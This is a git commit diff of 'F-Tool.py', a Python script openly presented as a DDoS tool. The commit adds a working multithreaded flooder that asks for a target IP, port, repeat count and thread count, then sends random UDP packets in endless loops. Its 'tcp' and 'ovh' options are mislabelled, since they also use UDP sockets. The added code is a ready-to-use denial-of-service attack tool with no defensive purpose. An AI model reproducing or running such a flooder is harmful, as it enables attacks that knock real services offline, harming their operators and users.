42c244f43f2d370adf13dd8d1bd911badec4d54f
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-22 11:41:18 +0300

    Update F-Tool.py

--- F-Tool.py
+++ F-Tool.py
@@ -2,70 +2,86 @@ import socket
 import random
 import os
 import time
+import random
+import socket
+import threading
+import time
+import os,sys
+import random, socket, threading
+import os
+import getpass
 
 time.sleep(1)
 os.system("clear")
-time.sleep(1)
-
-os.system("figlet Headwill")
-time.sleep(1)
-
-os.system("figlet Ataque")
-time.sleep(1)
 
 os.system("figlet DDoS")
-time.sleep(4)
-
-os.system("clear")
-os.system("figlet Aguarde")
 time.sleep(3)
-os.system("clear")
 
-print("""
-••20%
-""")
-time.sleep(1)
-os.system("clear")
+def  type(s):
 
-print("""
-••••40%
-""")
-time.sleep(1)
-os.system("clear")
+        for c in s  +  '\n' :
 
-print("""
-••••••60%
-""")
+              sys.stdout.write( c )
 
-time.sleep(1)
-os.system("clear")
+              sys.stdout.flush( )
 
-print("""
-••••••••80%
-""")
+              time.sleep(0.035)
 
-time.sleep(1)
-os.system("clear")
-
-print("""
-••••••••••100%
-""")
-time.sleep(2)
-os.system("clear")
-time.sleep(1)
-
+type("""Tools DDos Methods udp/tcp/ovh""")
 print()
-IP = input(" Digite o IP: => ")
-Porta = input(" Porta: => ")
-print("O IP e: ", IP)
-print("A Porta e: ", Porta)
+choice = str(input("$ methods udp/tcp/ovh : => "))
+ip = str(input("$ IP : => "))
+port = int(input("$ Port : => "))
+times = int(input("$ Times : => "))
+threads = int(input("$ Threads : => "))
 
-os.system("figlet INICIANDO")
-time.sleep(5)
-os.system("clear")
-time.sleep(1)
+def udp():
+	data = random._urandom(577)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" DDoS Has Sent")
+		except:
+			print("ERROR Command")
+			
+def tcp():
+	data = random._urandom(818)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" DDoS Has Sent")
+		except:
+			print("ERROR Command")
+			
+def ovh():
+	data = random._urandom(56000)
+	i = random.choice(("[+]","[-]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" DDoS Has Sent")
+		except:
+			print("ERROR Command")
 
-for x in range(50):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(1490)
-    print('Atacando porta 💥')
+for y in range(threads):
+	if choice == 'udp':
+		th = threading.Thread(target = udp)
+		th.start()
+	elif choice == 'tcp':
+		th = threading.Thread(target = tcp)
+		th.start()
+	elif choice == 'ovh':
+		th = threading.Thread(target = ovh)
+		th.start()
+#print('Atacando porta 💥')
